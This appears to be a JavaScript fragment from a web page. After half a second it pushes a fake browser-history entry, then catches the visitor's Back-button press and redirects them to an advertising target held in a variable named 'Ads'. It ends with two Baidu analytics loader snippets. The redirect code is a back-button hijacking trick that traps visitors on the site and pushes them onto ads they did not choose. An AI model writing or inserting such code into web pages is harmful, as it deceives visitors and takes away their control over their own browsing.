window.onhashchange = function() {
            jp();
        };

        function hh1() {
            history.pushState(history.length + 1, "message", "#" + new Date().getTime());
        }

        function jp() {
            fh();
        }
        setTimeout('hh1();', 500);

        function fh() {
            location.href = Ads;
        }
        var _hmt = _hmt || [];
        (function() {
            var hm = document.createElement("script");
            hm.src = "https://hm.baidu.com/hm.js?905f1b8809824a825f29d15371651f20";
            var s = document.getElementsByTagName("script")[0];
            s.parentNode.insertBefore(hm, s);
        })();
        var _hmt = _hmt || [];
        (function() {
            var hm = document.createElement("script");
            hm.src = "https://hm.baidu.com/hm.js?362571d334dfe4bbda42380c64db58ac";
            var s = document.getElementsByTagName("script")[0];
            s.parentNode.insertBefore(hm, s);
        })();